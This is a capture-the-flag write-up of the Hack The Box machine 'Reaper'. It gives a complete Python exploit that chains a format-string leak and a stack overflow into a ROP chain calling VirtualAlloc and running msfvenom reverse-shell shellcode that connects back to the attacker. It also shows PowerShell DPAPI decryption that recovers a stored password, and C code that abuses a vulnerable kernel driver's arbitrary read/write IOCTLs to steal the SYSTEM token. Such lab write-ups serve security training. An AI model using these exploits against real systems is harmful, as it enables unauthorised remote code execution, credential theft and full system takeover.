---
icon: skull
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 150132.png
coverY: -11.914621836992987
---

# HTB-REAPER(VL)

<figure><img src="../../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ rustscan -a 10.129.234.65 blah blah
```

```
Open 10.129.234.65:21
Open 10.129.234.65:80
Open 10.129.234.65:3389
Open 10.129.234.65:4141
Open 10.129.234.65:5040
Open 10.129.234.65:5357
Open 10.129.234.65:7680

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 08-15-23  12:12AM                  262 dev_keys.txt
|_08-14-23  02:53PM               187392 dev_keysvc.exe
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=reaper
4141/tcp open  oirtgsvc?
| fingerprint-strings:
|   GenericLines:
|     Choose an option:
|     1. Set key
|     2. Activate key
|     3. Exit
5040/tcp open  unknown
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The TTL of 127 confirms Windows one hop away. FTP is open with anonymous login. Port 4141 is immediately interesting — the nmap fingerprint shows a menu-driven service which almost always means pwn territory. Port 3389 means RDP is available if we get credentials. No SMB (445) or LDAP (389/636), so this is not a domain-joined machine.

#### FTP — TCP 21

Anonymous login gives us two files:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ ftp anonymous@10.129.234.65
Connected to 10.129.234.65.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
ftp> bin
ftp> get dev_keys.txt
ftp> get dev_keysvc.exe
```

Contents of `dev_keys.txt`:

```
Development Keys:

100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
```

The trailing segment of each key is base64-encoded:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ echo U3RhbmRhcmQgTGljZW5zZQ== | base64 -d
Standard License
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ echo UHJlbWl1bSBMaWNlbnNl | base64 -d
Premium License
```

The note says the activation function is buggy. That's the hint — whatever is broken in the activation path is our vulnerability.

`dev_keysvc.exe` is the binary behind port 4141:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ file dev_keysvc.exe
dev_keysvc.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
```

#### Service Enumeration — TCP 4141

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ nc 10.129.234.65 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
```

Option 1 accepts a key string. Arbitrary input returns "Invalid key format". Trying one of the dev keys from FTP:

```
Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
```

Option 2 after setting a valid key:

```
Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
Could not find key!
```

It decodes the base64 comment and prints it, then tries to look the key up in some file and fails. The comment printing is where the format string bug lives. The "bug in the activation function" mentioned in the note is both the format string and a buffer overflow — we just need to find them.

***

### Binary Reversing — dev\_keysvc.exe

#### Protection Check

Opening in PE-bear, the Optional Headers section shows NX (DEP) is enabled. ASLR is enabled at the OS level on Windows by default. This means raw shellcode on the stack won't execute, and we can't rely on fixed addresses — we need both a memory leak to defeat ASLR and a ROP chain to defeat DEP.

#### Key Validation Logic

Decompiling `validate_key` at `0x140001760` in Ghidra reveals the checksum algorithm:

The function rejects keys shorter than `0x17` bytes, validates that positions 3, 9, 13, and 18 are hyphens, and rejects non-ASCII bytes between positions 3 and 9. For every character that isn't a hyphen and is within the first `0x13` bytes, it takes `byte_value - 0x30` and adds it to a running total. That total is taken `mod 10000` to produce a four-digit checksum, which must match the number in the key at offset `0x13`.

Simulating this in Python to verify and build custom keys:

```python
>>> key = '100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ=='
>>> sum([ord(c) - 0x30 for c in key[:0x13] if c != '-'])
102
```

The checksum matches the `0102` in the key. Crucially, the base64 data after the last hyphen is completely ignored during checksum validation — only the first `0x13` bytes matter. This means we can put anything we want in the comment field:

```python
>>> key = '223-AAAAA-BBB-CCCC-0222-whatever'
>>> sum([ord(c) - 0x30 for c in key[:0x13] if c != '-'])
222
```

#### Format String Vulnerability

In `log_key` at `0x1400015b0`, the decompiler shows this call:

```c
_snprintf(keyStringBuffer, 0xff2, (char *)keyData);
```

This is calling `snprintf` with the user-controlled `keyData` as the format string instead of a static format string. This is a classic format string vulnerability. At the time of this call, the three arguments sit in RCX (output buffer), RDX (length), and R8 (our controlled format string). If we inject `%p`, the function will attempt to read the next argument register — R9 — which at that point in execution holds a constant address from the binary itself, giving us a pointer we can use to calculate the module base.

#### Buffer Overflow

Sending a long base64-encoded payload in the comment field causes the activation to hang when option 2 is selected. In x64dbg, the `ret` instruction at the end of `log_key` is about to execute, but the return address on the stack has been overwritten with `0x4141414141414141` — our "A"s.

Finding the exact offset using `peda`'s pattern generator:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ gdb -q -batch -ex "pattern_create 500" -ex "quit" | cut -d"'" -f2 | base64 -w0
```

After crashing and reading the value at `RSP` top in x64dbg, passing it to `pattern_offset`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ gdb -q -batch -ex "pattern_offset AAKAAgAA" -ex "quit"
AAKAAgAA found at offset: 88
```

The overflow offset is exactly 88 bytes before we control the return address.

***

### Exploitation — Shell as keysvc

#### Strategy

With DEP enabled, we can't jump to shellcode on the stack directly. The plan:

1. Use the format string leak to get a pointer from R9, calculate the module base (bypass ASLR).
2. Build a ROP chain that calls `VirtualAlloc` to make a region of the stack executable.
3. Return into shellcode placed after the ROP chain.

`VirtualAlloc` is already imported by the binary (confirmed in Ghidra's imports view), so we can use its IAT entry directly without needing to resolve it at runtime.

The `VirtualAlloc` call signature we need to set up:

```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,     // RCX = stack address
    SIZE_T dwSize,        // RDX = 0x1000
    DWORD  flAllocationType, // R8 = 0x1000 (MEM_COMMIT)
    DWORD  flProtect      // R9 = 0x40 (PAGE_EXECUTE_READWRITE)
);
```

#### Memory Leak — Defeating ASLR

Crafting a key where the comment begins with `%p`:

```python
>>> key = '%p -AAAAA-BBB-CCCC-____-U3RhbmRhcmQgTGljZW5zZQ=='
>>> sum([ord(c) - 0x30 for c in key[:0x13] if c != '-'])
252
```

Sending it and activating returns the R9 value printed into the output:

```
Checking key: 00007FF75A7F0660 -AAAAA, Comment: Standard License
```

The leaked address `0x7ff75a7f0660` is the address of the "Checking key: " string literal in the binary. In x64dbg with the module loaded at `0x7ff75a7d0000`, the offset is:

```python
>>> hex(0x00007FF75A7F0660 - 0x00007FF75A7D0000)
'0x20660'
```

Subtracting `0x20660` from any leaked address gives the module base.

#### ROP Gadgets

Dumping gadgets with Ropper and ROPgadget for cross-reference:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ ropper --file ./dev_keysvc.exe --nocolor > ropper.txt
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ ROPgadget --binary dev_keysvc.exe > ropgadget.txt
```

**R9 (flProtect = 0x40) — load via RBX:**

```
0x00000001400020d9: pop rbx; ret;
0x0000000140001f90: mov r9, rbx; mov r8, 0; add rsp, 8; ret;
```

The `mov r9, rbx` gadget also zeros R8 and pads RSP by 8 — since R8 needs to be loaded after this anyway, the zeroing is fine, and 8 bytes of junk absorbs the RSP shift.

**RCX (lpAddress) — get a stack address:**

```
0x0000000140001fa0: xor rbx, rsp; ret;
0x0000000140001fc2: push rbx; pop rax; ret;
0x0000000140001f80: mov rcx, rax; ret;
```

Zeroing RBX first with `pop rbx; ret`, then XORing with RSP gives a stack address in RBX. Moving through RAX into RCX loads that stack pointer into the first argument register.

**R8 (flAllocationType = 0x1000) — iterative add:**

No clean `pop r8` or `mov r8, value` gadget exists. The workaround is this add gadget applied repeatedly:

```
0x0000000140003918: add r8, r9; add rax, r8; ret;
```

R9 is already set to 0x40, so calling this `0x1000 / 0x40 = 64` times loads 0x1000 into R8.

**RDX (dwSize = 0x1000) and jump to VirtualAlloc:**

```
0x0000000140005adb: mov rdx, r8; jmp rax;
```

This moves R8 into RDX and then jumps to whatever is in RAX. If RAX holds the actual resolved address of `VirtualAlloc` (dereferenced from the IAT), this becomes the call to `VirtualAlloc` without needing a `call` instruction (which would corrupt the stack with a return address).

**Loading VirtualAlloc from IAT into RAX:**

The IAT entry for `VirtualAlloc` sits at offset `0x20000` from the binary base in Ghidra's view. Two gadgets handle this:

```
0x000000014000150a: pop rax; ret;
0x000000014001547f: mov rax, qword ptr [rax]; add rsp, 0x28; ret;
```

Loading the IAT address into RAX and then dereferencing it gives the actual runtime address of `VirtualAlloc`. The `add rsp, 0x28` side effect needs 0x28 bytes of junk padding.

**Return to shellcode — get RSP onto stack:**

```
0x000000014001becd: push rsp; and al, 8; ret;
```

After `VirtualAlloc` returns, this gadget pushes RSP onto the stack. The next `ret` pops RSP as the return address, jumping into whatever follows in memory — our shellcode.

**Fixing overwrite issue:**

When `VirtualAlloc` returns, the first 16 bytes of shellcode get overwritten by Windows bookkeeping. Adding a `add rsp, 0x10` gadget followed by 16 bytes of NOP sled before the `push rsp` gadget shifts execution past the corrupted region:

```
0x0000000140002029: add rsp, 0x10; ret;
```

#### Complete Exploit Script

```python
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "pwntools",
# ]
# ///
import sys
import subprocess
from base64 import b64encode
from pwn import remote, p64, unhex


def build_valid_key(id, serial, comment):
    assert serial[5] == serial[9] == '-'
    key_start = f"{id:03}-{serial}"
    checksum = sum(ord(c) - 0x30 for c in key_start if c != '-')
    encoded_comment = b64encode(comment.encode()).decode()
    return f"{key_start}-{checksum:04}-{encoded_comment}"


def generate_shellcode(lhost, lport):
    result = subprocess.run(
        f"msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp "
        f"-f hex LHOST={lhost} LPORT={lport}".split(),
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    print("[*] Generating shellcode")
    print(result.stderr)
    return unhex(result.stdout.strip())


if len(sys.argv) != 4:
    print(f"usage: {sys.argv[0]} <RHOST> <LHOST> <LPORT>")
    sys.exit()

RHOST, LHOST, LPORT = sys.argv[1], sys.argv[2], int(sys.argv[3])

# Phase 1: Leak module base via format string
p = remote(RHOST, 4141)
p.readuntil(b'Exit\n')
p.sendline(b'1')
key = build_valid_key("%p ", 'AAAAA-BBB-CCCC', 'leak')
p.readuntil(b'key: ')
p.sendline(key.encode())
p.readuntil(b'Exit\n')
p.sendline(b'2')
leak_addr = int(p.readline().split(b' ')[2].decode(), 16)
base_addr = leak_addr - 0x20660
print(f'[+] Leaked string address: 0x{leak_addr:x}')
print(f'[+] Base address: 0x{base_addr:x}')
p.close()

# Phase 2: Buffer overflow with ROP chain
p = remote(RHOST, 4141)
p.readuntil(b'Exit\n')
p.sendline(b'1')

# Gadget addresses (offsets from base)
pop_rbx         = p64(base_addr + 0x20d9)   # pop rbx; ret
mov_r9_rbx      = p64(base_addr + 0x1f90)   # mov r9, rbx; mov r8, 0; add rsp, 8; ret
xor_rbx_rsp     = p64(base_addr + 0x1fa0)   # xor rbx, rsp; ret
push_rbx_pop_rax= p64(base_addr + 0x1fc2)   # push rbx; pop rax; ret
mov_rcx_rax     = p64(base_addr + 0x1f80)   # mov rcx, rax; ret
add_r8_r9       = p64(base_addr + 0x3918)   # add r8, r9; add rax, r8; ret
pop_rax         = p64(base_addr + 0x150a)   # pop rax; ret
deref_rax       = p64(base_addr + 0x1547f)  # mov rax, [rax]; add rsp, 0x28; ret
mov_rdx_r8_jrax = p64(base_addr + 0x5adb)  # mov rdx, r8; jmp rax
add_rsp_0x10    = p64(base_addr + 0x2029)   # add rsp, 0x10; ret
push_rsp        = p64(base_addr + 0x1becd)  # push rsp; and al, 8; ret

VIRTUALALLOC_IAT = 0x20000  # offset in binary to IAT entry for VirtualAlloc

payload = b"A" * 88   # padding to RIP

# Load R9 = 0x40 (PAGE_EXECUTE_READWRITE)
payload += pop_rbx + p64(0x40)
payload += mov_r9_rbx
payload += b"JUNKJUNK"  # absorb add rsp, 8

# Load RCX = stack address (lpAddress)
payload += pop_rbx + p64(0)
payload += xor_rbx_rsp
payload += push_rbx_pop_rax
payload += mov_rcx_rax

# Build R8 = 0x1000 by adding R9 (0x40) 64 times
for _ in range(0x1000 // 0x40):
    payload += add_r8_r9

# Load RAX = VirtualAlloc from IAT
payload += pop_rax + p64(base_addr + VIRTUALALLOC_IAT)
payload += deref_rax + b"X" * 0x28

# RDX = R8 (0x1000), then jmp to VirtualAlloc in RAX
payload += mov_rdx_r8_jrax

# VirtualAlloc returns here — skip overwritten bytes, push RSP, land in shellcode
payload += add_rsp_0x10 + b"\x90" * 0x10
payload += push_rsp
payload += generate_shellcode(LHOST, LPORT)

# Encode payload and build the key
encoded = b64encode(payload).decode()
key = f"100-FE9A1-500-A270-0102-{encoded}"

p.readuntil(b'key: ')
p.sendline(key.encode())
p.readuntil(b'Exit\n')
p.sendline(b'2')
p.interactive()
```

Running it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ uv run --script exploit.py 10.129.234.65 10.10.14.24 443
[+] Opening connection to 10.129.234.65 on port 4141: Done
[+] Leaked string address: 0x7ff6cb480660
[+] Base address: 0x7ff6cb460000
[*] Generating shellcode
No encoder specified, outputting raw payload
Payload size: 460 bytes
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.65 59310
Microsoft Windows [Version 10.0.19045.6216]
(c) Microsoft Corporation. All rights reserved.

C:\keysvc>
```

```
C:\Users\keysvc\Desktop> type user.txt
ffe18953...
```

***

### Lateral Movement — DPAPI Password Decryption

Inside `C:\Users\keysvc`, there's a file named `automation.txt`. The content starts with `01000000d08c9ddf0115d1118c7a00c04fc297eb` — the standard signature for a DPAPI blob. This is a Windows Data Protection API encrypted string that can be decrypted by the current user's key material (meaning we need to be in their context, which we already are).

Switching to PowerShell and decrypting:

```powershell
PS C:\Users\keysvc> $secureString = Get-Content automation.txt | ConvertTo-SecureString
PS C:\Users\keysvc> $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
PS C:\Users\keysvc> [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
CatWinterMist10
```

Validating the credential against RDP with netexec:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ netexec rdp 10.129.234.65 -u keysvc -p CatWinterMist10
RDP  10.129.234.65  3389  REAPER  [+] reaper\keysvc:CatWinterMist10 (Pwn3d!)
```

The `(Pwn3d!)` tag means the user has RDP access. Connecting:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ xfreerdp /u:keysvc /p:CatWinterMist10 /v:10.129.234.65 +clipboard
```

***

### Privilege Escalation — Kernel Driver Abuse (Token Theft)

#### Enumeration

The system root contains a non-standard `C:\driver` directory:

```powershell
PS C:\driver> ls
-a----  7/27/2023  9:12 AM  8432  reaper.sys

PS C:\driver> driverquery /v | findstr reaper.sys
reaper  reaper  Kernel  Auto  Running  OK  TRUE  FALSE  \??\C:\driver\reaper.sys
```

A kernel driver named `reaper.sys` is actively running on this machine. Pulling it over for analysis using the RDP clipboard.

#### Reversing reaper.sys

Opening in Ghidra. The driver setup function at `0x1400011c8` registers three major function handlers:

```c
driverObject->MajorFunction[0]   = DispatchClose;   // IRP_MJ_CREATE
driverObject->MajorFunction[2]   = DispatchClose;   // IRP_MJ_CLOSE
driverObject->MajorFunction[0xe] = DispatchDeviceControl; // IRP_MJ_DEVICE_CONTROL
```

The device is created as `\\Device\\Reaper` with a symbolic link at `\\??\\Reaper`, accessible from userland as `\\.\Reaper`.

#### DispatchDeviceControl Analysis

The IOCTL handler at `0x140001020` switches on three control codes:

`0x80002003` — Initialization: allocates a 0x20-byte kernel buffer and populates it from user input, but only if the first DWORD matches the magic value `0x6a55cc9e`. The struct expects a thread ID, priority, and two 64-bit pointer fields (`src_addr` and `dst_addr`).

`0x8000200b` — Copy: reads 8 bytes from `src_addr` and writes them to `dst_addr`. Both addresses were set in the initialization call. This is an **arbitrary kernel read/write** — we can point `src_addr` at any kernel address and `dst_addr` at any kernel address.

`0x80002007` — Free: releases the allocation from step one.

These three IOCTLs together form a complete arbitrary read/write primitive in kernel space with no privilege checks beyond the magic value.

#### Building the Exploit — Token Theft

The attack is classic Windows kernel exploitation: walk the `_EPROCESS` linked list from the SYSTEM process (PID 4), find our current process, copy the SYSTEM process token pointer over our own token pointer. The kernel then believes our process has SYSTEM privileges.

First, finding the correct `_EPROCESS` offsets for this exact OS build using kernel debugging (WinDbg connected over serial to a matching Windows 10 Pro VM):

```
kd> dt nt!_EPROCESS
   +0x440 UniqueProcessId
   +0x448 ActiveProcessLinks
   +0x4b8 Token
```

With those offsets confirmed, the C exploit follows this structure:

**Data structure matching what the driver expects:**

```c
typedef struct ReaperData {
    DWORD magic;       // 0x6a55cc9e
    DWORD thread_id;
    DWORD priority;
    DWORD padding;
    ULONGLONG src_addr;
    ULONGLONG dst_addr;
} ReaperData;
```

**Arbitrary read primitive (8 bytes from kernel address):**

```c
ULONGLONG arbRead(ULONGLONG src) {
    ReaperData data;
    ULONGLONG output;

    data.magic     = 0x6A55CC9E;
    data.thread_id = GetCurrentThreadId();
    data.priority  = 0;
    data.padding   = 0;
    data.src_addr  = src;
    data.dst_addr  = (ULONGLONG)&output;

    Init(&data);
    Copy();
    Free();

    return output;
}
```

**Arbitrary write primitive (8 bytes to kernel address):**

```c
void arbWrite(ULONGLONG dst, ULONGLONG src) {
    ReaperData input;

    input.magic     = 0x6A55CC9E;
    input.thread_id = GetCurrentThreadId();
    input.priority  = 0;
    input.padding   = 0;
    input.src_addr  = src;
    input.dst_addr  = dst;

    Init(&input);
    Copy();
    Free();
}
```

**Walking ActiveProcessLinks to find a process by PID:**

```c
eProcResult GetEProcessByPid(DWORD targetPid) {
    ULONGLONG systemProc = getSystemEProcess();  // NtQuerySystemInformation + handle leak trick
    printf("[>] System _EPROCESS: 0x%llx\n", systemProc);

    BOOL found = 0;
    ULONGLONG cProcess = systemProc;
    DWORD cPid = 0;
    ULONGLONG cTokenPtr;

    while (!found) {
        cProcess  = arbRead(cProcess + 0x448);  // ActiveProcessLinks.Flink
        cProcess -= 0x448;                       // back to start of _EPROCESS
        cPid      = (DWORD)arbRead(cProcess + 0x440);  // UniqueProcessId
        cTokenPtr =        arbRead(cProcess + 0x4b8);  // Token
        if (cPid == targetPid) {
            found = 1;
            break;
        }
    }

    static eProcResult result;
    result.eProcess = cProcess;
    result.tokenPtr = cTokenPtr;
    result.pid      = cPid;
    return result;
}
```

**Main — copy SYSTEM token and spawn shell:**

```c
void main(void) {
    eProcResult currentProcess = GetEProcessByPid(GetCurrentProcessId());
    eProcResult systemProcess  = GetEProcessByPid(4);  // PID 4 is always SYSTEM

    printf("[>] Current process _EPROCESS: 0x%llx\n", currentProcess.eProcess);
    printf("[>] System  process _EPROCESS: 0x%llx\n", systemProcess.eProcess);

    // Copy the token pointer from SYSTEM _EPROCESS into our _EPROCESS
    arbWrite(currentProcess.eProcess + 0x4b8, systemProcess.eProcess + 0x4b8);

    printf("[+] Token stolen, spawning shell...\n");
    system("powershell.exe");

    if (hReaper) CloseHandle(hReaper);
}
```

Compiling cross-platform with mingw:

```
┌──(sn0x㉿sn0x)-[~/HTB/Reaper]
└─$ x86_64-w64-mingw32-gcc reaperpriv.c -o reaperpriv.exe
```

Copying `reaperpriv.exe` into the RDP session via clipboard and running it:

```
[+] Got handle to device, \\.\Reaper
[>] System _EPROCESS: 0xffffbd0e47c44040
[>] Current process _EPROCESS: 0xffffbd0e4a1c3080
[>] System process _EPROCESS (PID 4): 0xffffbd0e47c44040
[+] Token stolen, spawning shell...
```

The PowerShell window that opens is running as SYSTEM:

```powershell
PS C:\Users\keysvc\Desktop> whoami
nt authority\system

PS C:\Users\Administrator\Desktop> type root.txt
58f9ec4f...
```

***

### Attack Chain

```
[FTP - Anonymous Login]
        |
        v
dev_keysvc.exe + dev_keys.txt retrieved
        |
        v
Reverse binary in Ghidra:
  - Key validation checksum algorithm understood
  - Format string vuln in log_key() (snprintf with user-controlled format)
  - Buffer overflow in log_key() (88-byte offset to RIP)
        |
        v
Format string %p leak --> R9 holds binary pointer
  --> subtract 0x20660 --> module base address (ASLR bypassed)
        |
        v
ROP chain construction (DEP bypassed):
  pop rbx / mov r9,rbx     --> R9 = 0x40  (PAGE_EXECUTE_READWRITE)
  xor rbx,rsp chain        --> RCX = stack address
  64x add r8,r9            --> R8 = 0x1000
  pop rax / deref IAT      --> RAX = VirtualAlloc runtime address
  mov rdx,r8 / jmp rax     --> call VirtualAlloc (RDX = 0x1000)
  add rsp,0x10 / push rsp  --> skip overwritten bytes, jump into shellcode
        |
        v
msfvenom windows/x64/shell_reverse_tcp shellcode
        |
        v
[Shell as keysvc]
        |
        v
C:\Users\keysvc\automation.txt -- DPAPI blob
  --> ConvertTo-SecureString + PtrToStringBSTR --> CatWinterMist10
        |
        v
RDP login: keysvc:CatWinterMist10
        |
        v
[RDP session as keysvc]
        |
        v
C:\driver\reaper.sys -- kernel driver, actively running
  --> Ghidra: 3 IOCTLs = arbitrary kernel read + write primitive
  --> Kernel debugging: _EPROCESS offsets for Win10 Build 19045
        |
        v
Token theft exploit (reaperpriv.exe):
  getSystemEProcess() --> walk ActiveProcessLinks
  arbRead()  --> locate SYSTEM and current _EPROCESS
  arbWrite() --> overwrite current process token with SYSTEM token
        |
        v
[PowerShell as NT AUTHORITY\SYSTEM]
        |
        v
root.txt
```

***

### Techniques

| Technique                                         | Where Used                                                                       |
| ------------------------------------------------- | -------------------------------------------------------------------------------- |
| Anonymous FTP enumeration                         | Downloading `dev_keysvc.exe` and `dev_keys.txt`                                  |
| Static binary reversing (Ghidra)                  | Understanding key validation checksum algorithm                                  |
| Format string vulnerability (`%p` leak)           | Leaking a binary pointer from R9 via `snprintf` format string bug                |
| ASLR bypass via memory leak                       | Calculating module base from the leaked `R9` pointer (offset `0x20660`)          |
| DEP bypass via ROP + VirtualAlloc                 | Chaining gadgets to make stack executable before jumping to shellcode            |
| Buffer overflow offset calculation (peda pattern) | Finding 88-byte offset to RIP control in `log_key` stack frame                   |
| ROP gadget hunting (Ropper + ROPgadget)           | Building register-loading chain for `VirtualAlloc` arguments                     |
| IAT dereferencing in ROP                          | Resolving runtime `VirtualAlloc` address from binary's import address table      |
| `msfvenom` shellcode generation                   | Generating `windows/x64/shell_reverse_tcp` payload for the executable stack      |
| DPAPI blob decryption (PowerShell)                | Decrypting `automation.txt` to recover `keysvc` password `CatWinterMist10`       |
| RDP access with recovered credentials             | Gaining interactive session as `keysvc`                                          |
| Kernel driver reversing (Ghidra)                  | Identifying three IOCTLs in `reaper.sys` forming arbitrary read/write primitives |
| Kernel debugging (WinDbg over serial)             | Identifying `_EPROCESS` field offsets for Windows 10 Build 19045                 |
| Token theft via arbitrary kernel write            | Copying SYSTEM process token into current `_EPROCESS.Token` field                |
| `ActiveProcessLinks` walking                      | Locating target `_EPROCESS` structures for PID 4 (SYSTEM) and current process    |
| Cross-compilation with mingw                      | Building Windows kernel exploit on Linux (`x86_64-w64-mingw32-gcc`)              |



<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>

